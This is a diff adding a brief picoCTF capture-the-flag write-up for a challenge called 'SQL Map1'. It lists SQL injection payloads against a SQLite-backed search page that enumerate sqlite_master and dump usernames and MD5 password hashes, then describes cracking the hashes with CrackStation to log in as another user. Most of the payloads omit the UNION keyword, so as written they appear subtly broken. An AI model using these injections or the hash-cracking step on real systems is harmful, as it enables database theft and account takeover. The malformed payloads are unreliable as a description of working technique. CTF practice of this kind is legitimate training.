@@ -1,0 +1,24 @@
+picoctf Sql Map1 writeup
+
+1.try to use sql injection on login page but not available
+
+2.so i register one account (username=111,password=111)
+
+3.login , try to use sql injection on searching page , know it is sqlite
+
+=> p' ORDER BY 2 -- 
+=> p' SELECT sqlite_version(),2 -- 
+=> p' SELECT sql,2 FROM sqlite_master -- 
+=> p' SELECT tbl_name,2 FROM sqlite_master WHERE type='table' -- 
+=> p' SELECT sql,2 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users' -- 
+=> p' SELECT username,password FROM users -- 
+
+4.now we get several users , but its password is encrypted by md5
+
+5.look its third hint , we use CrackStation to bomb these hashs
+
+6.but except ctf-player and our registering account , other account cannot be bombed 
+
+7.try to use ctf-player to login 
+
+8.get flag!
